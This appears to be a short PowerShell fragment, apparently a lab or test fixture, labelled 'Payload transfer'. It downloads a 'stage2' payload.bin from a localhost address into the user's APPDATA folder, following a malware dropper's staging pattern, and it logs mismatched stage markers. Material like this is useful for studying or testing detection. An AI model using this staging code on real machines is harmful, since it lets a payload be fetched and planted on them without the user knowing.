# Payload transfer
$Stage2Url = "http://localhost:9001/payload.bin"
$OutputPath = "$env:APPDATA\stage2.bin"
Invoke-WebRequest -Uri $Stage2Url -OutFile $OutputPath -UseBasicParsing
$StageMarker = "stage-41"
Write-Verbose "stage marker 36 reached"
